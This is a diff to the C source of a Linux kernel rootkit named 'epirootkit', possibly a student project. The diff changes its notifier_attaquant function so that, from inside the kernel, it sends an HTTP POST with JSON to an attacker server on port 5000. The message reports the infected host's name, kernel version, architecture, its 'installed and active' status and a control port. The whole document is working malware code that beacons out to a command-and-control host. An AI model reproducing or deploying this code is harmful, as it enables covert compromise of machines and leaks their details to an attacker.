@@ -9,6 +9,7 @@
 #include <linux/delay.h>
 #include <linux/jiffies.h>
 #include "notification.h"
+#include "epirootkit.h"
 
 int notifier_attaquant(void)
 {
@@ -16,11 +17,12 @@ int notifier_attaquant(void)
     struct sockaddr_in addr;
     struct msghdr msg;
     struct kvec iov;
-    char *message;
+    char *json_data;
+    char *http_request;
     int ret;
     unsigned char ip_binary[4];
     
-    pr_info("epirootkit: DEBUT notification vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
+    pr_info("epirootkit: DEBUT notification vers %s:5000\n", SERVEUR_ATTAQUANT);
     
     ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret < 0) {
@@ -30,7 +32,7 @@ int notifier_attaquant(void)
     
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(PORT_NOTIFICATION);
+    addr.sin_port = htons(5000);
     
     ret = in4_pton(SERVEUR_ATTAQUANT, -1, ip_binary, -1, NULL);
     if (ret == 0) {
@@ -41,53 +43,76 @@ int notifier_attaquant(void)
     
     memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
     
-    pr_info("epirootkit: Tentative connexion vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
+    pr_info("epirootkit: Tentative connexion vers %s:5000\n", SERVEUR_ATTAQUANT);
     
     ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
     if (ret < 0) {
-        pr_err("epirootkit: ECHEC connexion vers %s:%d (erreur: %d)\n", 
-                SERVEUR_ATTAQUANT, PORT_NOTIFICATION, ret);
+        pr_err("epirootkit: ECHEC connexion vers %s:5000 (erreur: %d)\n", 
+                SERVEUR_ATTAQUANT, ret);
         sock_release(sock);
         return ret;
     }
     
-    pr_info("epirootkit: Connexion reussie vers %s:%d\n", SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
+    pr_info("epirootkit: Connexion reussie vers %s:5000\n", SERVEUR_ATTAQUANT);
     
-    message = kmalloc(1024, GFP_KERNEL);
-    if (!message) {
+    json_data = kmalloc(1024, GFP_KERNEL);
+    if (!json_data) {
         sock_release(sock);
         return -ENOMEM;
     }
     
-    snprintf(message, 1024, 
-             "ROOTKIT_ALERT\n"
-             "Hostname: %s\n"
-             "Kernel: %s %s\n"
-             "Architecture: %s\n"
-             "Status: INSTALLE ET ACTIF\n"
-             "Port_controle: 8005\n"
-             "Timestamp: %lld\n",
+    snprintf(json_data, 1024, 
+             "{"
+             "\"type\":\"ROOTKIT_ALERT\","
+             "\"hostname\":\"%s\","
+             "\"kernel\":\"%s %s\","
+             "\"architecture\":\"%s\","
+             "\"status\":\"INSTALLE ET ACTIF\","
+             "\"port_controle\":%d,"
+             "\"timestamp\":%lld"
+             "}",
              utsname()->nodename,
              utsname()->sysname,
              utsname()->release,
              utsname()->machine,
+             PORT_CONTROLE,
              ktime_get_real_seconds());
     
+    http_request = kmalloc(2048, GFP_KERNEL);
+    if (!http_request) {
+        kfree(json_data);
+        sock_release(sock);
+        return -ENOMEM;
+    }
+    
+    snprintf(http_request, 2048,
+             "POST /api/receive_notification HTTP/1.1\r\n"
+             "Host: %s:5000\r\n"
+             "Content-Type: application/json\r\n"
+             "Content-Length: %zu\r\n"
+             "Connection: close\r\n"
+             "\r\n"
+             "%s",
+             SERVEUR_ATTAQUANT,
+             strlen(json_data),
+             json_data);
+    
     memset(&msg, 0, sizeof(msg));
-    iov.iov_base = message;
-    iov.iov_len = strlen(message);
+    iov.iov_base = http_request;
+    iov.iov_len = strlen(http_request);
     
-    pr_info("epirootkit: Envoi message de %zu octets\n", strlen(message));
+    pr_info("epirootkit: Envoi requête HTTP de %zu octets\n", strlen(http_request));
     
-    ret = kernel_sendmsg(sock, &msg, &iov, 1, strlen(message));
+    ret = kernel_sendmsg(sock, &msg, &iov, 1, strlen(http_request));
     if (ret < 0) {
         pr_err("epirootkit: Erreur envoi notification: %d\n", ret);
     } else {
-        pr_info("epirootkit: Notification envoyee avec succes (%d octets) vers %s:%d\n", 
-                ret, SERVEUR_ATTAQUANT, PORT_NOTIFICATION);
+        pr_info("epirootkit: Notification HTTP envoyée avec succès (%d octets) vers %s:5000\n", 
+                ret, SERVEUR_ATTAQUANT);
     }
     
-    kfree(message);
+    kfree(json_data);
+    kfree(http_request);
     sock_release(sock);
     return ret;
 }
